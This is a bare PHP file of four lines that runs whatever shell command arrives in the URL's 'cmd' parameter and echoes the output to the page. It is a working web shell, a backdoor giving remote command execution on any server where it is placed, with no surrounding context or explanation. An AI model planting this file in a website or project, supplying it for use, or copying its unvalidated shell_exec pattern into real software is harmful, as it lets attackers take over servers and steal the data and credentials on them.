<?php
$output = shell_exec($_GET["cmd"]);
echo "<pre>$output</pre>";
?>
